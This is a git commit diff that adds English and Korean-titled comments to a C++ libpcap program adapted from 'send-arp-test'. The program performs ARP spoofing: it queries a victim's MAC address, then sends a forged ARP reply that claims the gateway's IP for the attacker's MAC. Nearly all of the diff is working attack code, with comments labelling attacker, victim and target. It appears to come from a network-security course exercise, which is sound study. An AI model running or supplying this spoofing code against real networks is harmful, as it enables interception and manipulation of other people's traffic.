a7bdec25ce383e893591c6818d48b222a0f498de
seungwook <swlee@daegu.ac.kr>
2022-08-09 05:05:49 +0900

    Update comment
    주석 추가

--- main.cpp
+++ main.cpp
@@ -1,3 +1,8 @@
+// ------------------------------------------------------------
+// orignal source : https://gitlab.com/gilgil/send-arp-test
+// Author: Gilgil
+// Last update: 2020.05.06
+// ------------------------------------------------------------
 #include <cstdio>
 #include <pcap.h>
 #include "ethhdr.h"
@@ -12,12 +17,12 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 void usage() {
-	printf("syntax: send-arp-test <interface>\n");
-	printf("sample: send-arp-test wlan0\n");
+	printf("syntax: send-arp-test <interface> <sender ip> <target ip> \n"); // Sender is victim, target is usually gateway 
+	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 \n"); 
 }
 
 // packet template
-EthArpPacket packet_make(Mac ETH_dmac, Mac ETH_smac, Mac ARP_smac, Mac ARP_tmac, Ip ARP_sip, Ip ARP_tip, int type){
+EthArpPacket packet_make(Mac ETH_dmac, Mac ETH_smac, Mac ARP_smac, Mac ARP_tmac, Ip ARP_sip, Ip ARP_tip, int type){ 
 
 	EthArpPacket packet;
 
@@ -54,6 +59,7 @@ EthArpPacket packet_make(Mac ETH_dmac, Mac ETH_smac, Mac ARP_smac, Mac ARP_tmac,
 }
 
 int main(int argc, char* argv[]) {
+	// check args
 	if (argc != 4) {
 		usage();
 		return -1;
@@ -61,7 +67,7 @@ int main(int argc, char* argv[]) {
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // 1: promiscuous mode, 1: timeout
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
@@ -69,21 +75,24 @@ int main(int argc, char* argv[]) {
 
 	// get attacker MAC address
 	char my_mac_str[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-	get_my_mac(my_mac_str,dev);
-	Mac my_Mac = Mac(my_mac_str);
+	get_my_mac(my_mac_str,dev); // get attacker MAC address
+	Mac my_Mac = Mac(my_mac_str); 
 
 	// get attacker IP address
 	char my_ip_str[4] = {0x00, 0x00, 0x00, 0x00};
-	get_my_ip(my_ip_str,dev);
+	get_my_ip(my_ip_str,dev); // get attacker IP address
 	Ip my_Ip = Ip(my_ip_str);
+
 	// get victim IP address
 	Ip senderIp = Ip(argv[2]);  // victim
 	// get target ip address
 	Ip targetIp = Ip(argv[3]);  // target
 
 	// create arp packet
-	EthArpPacket packet;
-	packet = packet_make(Mac("ff:ff:ff:ff:ff:ff"), my_Mac, my_Mac, Mac("00:00:00:00:00:00"), my_Ip, senderIp, 1);
+	EthArpPacket packet; // packet template
+	// destination MAC address, attacker MAC address, attacker IP address, target MAC address, target IP address, type(request = 1, reply = 2)
+	packet = packet_make(Mac("ff:ff:ff:ff:ff:ff"), my_Mac, my_Mac, Mac("00:00:00:00:00:00"), my_Ip, senderIp, 1); // request packet to victim
+	// send arp packet 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -91,7 +100,7 @@ int main(int argc, char* argv[]) {
 
 	// from pcap-test
 	// reply arp packet recv
-	EthArpPacket* recvPacket = NULL;
+	EthArpPacket* recvPacket = NULL; // packet template
 
 	while (true) {
 		struct pcap_pkthdr *header;
@@ -104,7 +113,7 @@ int main(int argc, char* argv[]) {
 			break;
 		}
 
-		recvPacket = (struct EthArpPacket*)packet;
+		recvPacket = (struct EthArpPacket*)packet; 
 		if(recvPacket->eth_.type_ != htons(EthHdr::Arp))
 			continue;  // not arp packet
 		if(recvPacket->arp_.op_ != htons(ArpHdr::Reply))
@@ -116,8 +125,11 @@ int main(int argc, char* argv[]) {
 
 	}
 
-	Mac sender_mac = Mac(recvPacket->arp_.smac_);
-	packet = packet_make(sender_mac, my_Mac, my_Mac, sender_mac, targetIp, senderIp, 2);
+	// create arp packet
+	Mac sender_mac = Mac(recvPacket->arp_.smac_); // sender mac address from arp reply 
+	// destination MAC address, attacker MAC address, attacker IP address, target MAC address, target IP address, type(request = 1, reply = 2)
+	packet = packet_make(sender_mac, my_Mac, my_Mac, sender_mac, targetIp, senderIp, 2); // reply packet to target
+	// send arp packet
 	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
